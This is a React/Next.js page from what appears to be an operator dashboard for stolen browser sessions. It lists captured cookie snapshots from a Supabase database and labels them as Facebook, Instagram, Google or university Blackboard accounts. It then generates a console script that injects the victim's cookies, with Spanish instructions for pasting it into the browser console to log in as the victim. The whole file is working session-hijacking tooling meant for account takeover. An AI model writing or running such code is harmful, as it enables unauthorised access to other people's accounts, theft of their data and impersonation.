"use client";

import React, { useEffect, useState } from "react";
import { supabase, SessionSnapshot, Cookie } from "@/lib/supabase";
import GlassCard from "@/components/GlassCard";
import { 
  Search, Clock, Globe, ExternalLink, 
  Shield, Facebook, Instagram, GraduationCap, LayoutGrid, List, Check, Copy
} from "lucide-react";
import { motion, AnimatePresence } from "framer-motion";

interface AccountInfo {
  platform: "Facebook" | "Instagram" | "Google" | "Blackboard" | "Unknown";
  identifier: string;
  icon: any;
  color: string;
}

export default function SessionsPage() {
  const [sessions, setSessions] = useState<SessionSnapshot[]>([]);
  const [loading, setLoading] = useState(true);
  const [searchTerm, setSearchTerm] = useState("");
  const [selectedSession, setSelectedSession] = useState<SessionSnapshot | null>(null);
  const [cookies, setCookies] = useState<Cookie[]>([]);
  const [loadingCookies, setLoadingCookies] = useState(false);
  const [viewMode, setViewMode] = useState<"grid" | "list">("grid");
  const [accountMap, setAccountMap] = useState<Record<string, AccountInfo>>({});
  const [copied, setCopied] = useState(false);

  useEffect(() => {
    fetchSessions();
  }, []);

  const identifyAccount = (sessionCookies: Cookie[], fallbackId: string): AccountInfo => {
    const fbCookie = sessionCookies.find(c => c.domain.includes("facebook.com") && c.name === "c_user");
    if (fbCookie) return { platform: "Facebook", identifier: fbCookie.value, icon: Facebook, color: "text-blue-500" };

    const igCookie = sessionCookies.find(c => c.domain.includes("instagram.com") && c.name === "ds_user_id");
    if (igCookie) return { platform: "Instagram", identifier: igCookie.value, icon: Instagram, color: "text-pink-500" };

    const gCookie = sessionCookies.find(c => c.domain.includes("google.com") && (c.name === "SID" || c.name === "HSID"));
    if (gCookie) return { platform: "Google", identifier: "Google Account", icon: Globe, color: "text-red-400" };

    const bbCookie = sessionCookies.find(c => c.domain.includes("up.edu.pe") || c.domain.includes("blackboard.com"));
    if (bbCookie) return { platform: "Blackboard", identifier: "UP Student", icon: GraduationCap, color: "text-blue-400" };

    return { platform: "Unknown", identifier: fallbackId || "Generic Session", icon: Shield, color: "text-gray-400" };
  };

  const fetchSessions = async () => {
    setLoading(true);
    const { data: sessionData } = await supabase
      .from("session_snapshots")
      .select("*")
      .order("captured_at", { ascending: false })
      .limit(50);
    
    if (sessionData) {
      setSessions(sessionData);
      const sessionIds = sessionData.map(s => s.id);
      const { data: cookieData } = await supabase
        .from("cookies")
        .select("*")
        .in("snapshot_id", sessionIds)
        .or("name.eq.c_user,name.eq.ds_user_id,name.eq.SID,name.eq.HSID");
      
      const newAccountMap: Record<string, AccountInfo> = {};
      sessionData.forEach(session => {
        const sessionCookies = cookieData?.filter(c => c.snapshot_id === session.id) || [];
        newAccountMap[session.id] = identifyAccount(sessionCookies, session.user_id);
      });
      setAccountMap(newAccountMap);
    }
    setLoading(false);
  };

  const fetchCookies = async (snapshotId: string) => {
    setLoadingCookies(true);
    const { data } = await supabase
      .from("cookies")
      .select("*")
      .eq("snapshot_id", snapshotId);
    
    if (data) setCookies(data);
    setLoadingCookies(false);
  };

  const handleSessionClick = (session: SessionSnapshot) => {
    setSelectedSession(session);
    setCopied(false);
    fetchCookies(session.id);
  };

  const generateConsoleScript = () => {
    if (cookies.length === 0) return "";
    
    const script = `(function() {
  const cookies = ${JSON.stringify(cookies)};
  console.clear();
  console.log('%c [SessionSafe] Inyectando Acceso... ', 'background: #2563eb; color: #fff; font-weight: bold; border-radius: 4px; padding: 5px;');
  
  cookies.forEach(c => {
    try {
      document.cookie = c.name + '=' + encodeURIComponent(c.value) + 
                      '; domain=' + c.domain + 
                      '; path=' + (c.path || '/') + 
                      '; SameSite=Lax; Secure';
    } catch (e) {}
  });
  
  console.log('%c ¡ÉXITO! Recargando para iniciar sesión... ', 'color: #10b981; font-weight: bold;');
  setTimeout(() => location.reload(), 1000);
})();`;

    return script;
  };

  const copyToClipboard = () => {
    const script = generateConsoleScript();
    if (!script) return;

    navigator.clipboard.writeText(script).then(() => {
      setCopied(true);
      setTimeout(() => setCopied(false), 3000);
    }).catch(err => {
      console.error('Clipboard error:', err);
      prompt("Copia este código y pégalo en la consola:", script);
    });
  };

  const filteredSessions = sessions.filter(s => 
    s.user_id?.toLowerCase().includes(searchTerm.toLowerCase()) ||
    accountMap[s.id]?.identifier.toLowerCase().includes(searchTerm.toLowerCase()) ||
    accountMap[s.id]?.platform.toLowerCase().includes(searchTerm.toLowerCase())
  );

  return (
    <div className="space-y-8 max-w-7xl mx-auto pb-40">
      <header className="flex flex-col md:flex-row md:items-center justify-between gap-4">
        <div>
          <h2 className="text-3xl font-bold tracking-tight">Active Accounts</h2>
          <p className="text-gray-400">Captured sessions automatically identified from cookies.</p>
        </div>
        
        <div className="flex items-center gap-3">
          <div className="glass flex items-center px-4 py-2 rounded-2xl border border-white/10 focus-within:border-blue-500/50 transition-colors w-full md:w-64">
            <Search className="text-gray-500 mr-2" size={18} />
            <input 
              type="text" 
              placeholder="Search ID or Account..." 
              className="bg-transparent border-none outline-none text-sm w-full py-2"
              value={searchTerm}
              onChange={(e) => setSearchTerm(e.target.value)}
            />
          </div>
          <div className="glass p-1 rounded-xl flex gap-1">
            <button onClick={() => setViewMode("grid")} className={`p-2 rounded-lg transition-colors ${viewMode === "grid" ? "bg-blue-600 text-white" : "text-gray-500 hover:text-white"}`}>
              <LayoutGrid size={18} />
            </button>
            <button onClick={() => setViewMode("list")} className={`p-2 rounded-lg transition-colors ${viewMode === "list" ? "bg-blue-600 text-white" : "text-gray-500 hover:text-white"}`}>
              <List size={18} />
            </button>
          </div>
        </div>
      </header>

      {loading ? (
        <div className="grid grid-cols-1 md:grid-cols-3 lg:grid-cols-4 gap-6">
          {[1, 2, 3, 4, 5, 6, 7, 8].map(i => <div key={i} className="h-48 glass rounded-3xl animate-pulse" />)}
        </div>
      ) : (
        <div className="grid grid-cols-1 lg:grid-cols-12 gap-8">
          <div className="lg:col-span-12">
            {viewMode === "grid" ? (
              <div className="grid grid-cols-1 md:grid-cols-3 lg:grid-cols-4 gap-6">
                {filteredSessions.map((session, idx) => {
                  const info = accountMap[session.id] || { platform: "Unknown", identifier: session.user_id, icon: Shield, color: "text-gray-500" };
                  return (
                    <motion.div
                      key={session.id}
                      layoutId={session.id}
                      initial={{ opacity: 0, scale: 0.9 }}
                      animate={{ opacity: 1, scale: 1 }}
                      transition={{ delay: idx * 0.05 }}
                      onClick={() => handleSessionClick(session)}
                      className={`glass p-6 rounded-3xl cursor-pointer border-2 transition-all hover:scale-[1.03] active:scale-[0.98] ${selectedSession?.id === session.id ? "border-blue-500 shadow-xl shadow-blue-500/20 bg-blue-500/5" : "border-transparent hover:border-white/10"}`}
                    >
                      <div className="flex items-start justify-between mb-4">
                        <div className={`p-3 rounded-2xl bg-white/5 ${info.color}`}>
                          <info.icon size={28} />
                        </div>
                        <div className="glass-pill px-3 py-1 rounded-full text-[10px] font-bold uppercase tracking-wider text-gray-400">
                          {info.platform}
                        </div>
                      </div>
                      <div>
                        <h4 className="font-bold text-lg truncate mb-1">{info.identifier}</h4>
                        <div className="flex items-center gap-2 text-xs text-gray-500">
                          <Clock size={12} />
                          {new Date(session.captured_at).toLocaleDateString()}
                        </div>
                      </div>
                    </motion.div>
                  );
                })}
              </div>
            ) : (
              <div className="glass overflow-hidden rounded-3xl border border-white/10">
                <table className="w-full text-left">
                  <thead>
                    <tr className="bg-white/5 text-gray-400 text-xs font-bold uppercase tracking-wider">
                      <th className="px-6 py-4">Account Identifier</th>
                      <th className="px-6 py-4">Platform</th>
                      <th className="px-6 py-4">Captured At</th>
                      <th className="px-6 py-4 text-right">Action</th>
                    </tr>
                  </thead>
                  <tbody className="divide-y divide-white/5">
                    {filteredSessions.map((session) => {
                      const info = accountMap[session.id] || { platform: "Unknown", identifier: session.user_id, icon: Shield, color: "text-gray-500" };
                      return (
                        <tr key={session.id} onClick={() => handleSessionClick(session)} className={`hover:bg-white/5 cursor-pointer transition-colors ${selectedSession?.id === session.id ? "bg-blue-500/10" : ""}`}>
                          <td className="px-6 py-4 font-medium">{info.identifier}</td>
                          <td className="px-6 py-4">
                            <div className="flex items-center gap-2">
                              <info.icon size={14} className={info.color} />
                              <span className="text-xs">{info.platform}</span>
                            </div>
                          </td>
                          <td className="px-6 py-4 text-xs text-gray-500">{new Date(session.captured_at).toLocaleString()}</td>
                          <td className="px-6 py-4 text-right">
                            <ExternalLink size={16} className="text-gray-600 ml-auto" />
                          </td>
                        </tr>
                      );
                    })}
                  </tbody>
                </table>
              </div>
            )}
          </div>
        </div>
      )}

      <AnimatePresence>
        {selectedSession && (
          <motion.div 
            initial={{ opacity: 0, y: 100 }}
            animate={{ opacity: 1, y: 0 }}
            exit={{ opacity: 0, y: 100 }}
            className="fixed bottom-0 left-0 right-0 p-8 z-50 pointer-events-none"
          >
            <div className="max-w-4xl mx-auto pointer-events-auto">
              <GlassCard className="border-t-2 border-blue-500 shadow-[0_-20px_80px_rgba(0,0,0,0.8)] bg-black/90 backdrop-blur-2xl">
                <div className="flex flex-col md:flex-row items-center justify-between gap-6">
                  <div className="flex items-center gap-5">
                    <div className={`p-4 rounded-3xl bg-white/5 ${accountMap[selectedSession.id]?.color}`}>
                      {accountMap[selectedSession.id]?.icon && React.createElement(accountMap[selectedSession.id].icon, { size: 48 })}
                    </div>
                    <div>
                      <h3 className="text-2xl font-bold flex items-center gap-2">
                        {accountMap[selectedSession.id]?.identifier}
                        <span className="text-xs font-normal text-gray-500">#{selectedSession.id.slice(0, 8)}</span>
                      </h3>
                      <p className="text-gray-400">Listo para inyectar en {accountMap[selectedSession.id]?.platform.toLowerCase()}.com</p>
                    </div>
                  </div>
                  
                  <div className="flex gap-4">
                    <button 
                      onClick={() => setSelectedSession(null)}
                      className="px-6 py-4 rounded-2xl glass hover:bg-white/10 transition-colors font-bold text-gray-400"
                    >
                      Cerrar
                    </button>
                    <button 
                      onClick={copyToClipboard}
                      className={"flex items-center gap-3 px-10 py-4 rounded-2xl transition-all font-black text-xl shadow-2xl active:scale-95 group " + (copied ? "bg-emerald-600 shadow-emerald-600/30" : "bg-blue-600 hover:bg-blue-500 shadow-blue-600/30")}
                    >
                      {copied ? (
                        <>
                          <Check size={24} className="animate-bounce" />
                          ¡COPIADO!
                        </>
                      ) : (
                        <>
                          <Copy size={24} className="group-hover:rotate-6 transition-transform" />
                          ENTRAR AHORA
                        </>
                      )}
                    </button>
                  </div>
                </div>
                
                {copied && (
                   <motion.div 
                     initial={{ opacity: 0, height: 0 }}
                     animate={{ opacity: 1, height: "auto" }}
                     className="mt-6 p-4 rounded-2xl bg-white/5 border border-white/10 space-y-3"
                   >
                     <p className="text-sm font-bold text-blue-400"> ÚLTIMO PASO OBLIGATORIO:</p>
                     <ol className="text-xs text-gray-400 space-y-2 list-decimal list-inside">
                       <li>Ve a la pestaña de {accountMap[selectedSession.id]?.platform} en tu navegador.</li>
                       <li>Presiona <kbd className="px-1 py-0.5 glass rounded mx-1">F12</kbd> y entra a la pestaña <span className="text-white font-bold underline">Console</span>.</li>
                       <li>Escribe <code className="text-amber-400 px-1">allow pasting</code> y dale a Enter.</li>
                       <li>Pega el código recién copiado (<kbd className="px-1 py-0.5 glass rounded">Ctrl + V</kbd>) y dale a Enter.</li>
                     </ol>
                   </motion.div>
                )}
              </GlassCard>
            </div>
          </motion.div>
        )}
      </AnimatePresence>
    </div>
  );
}
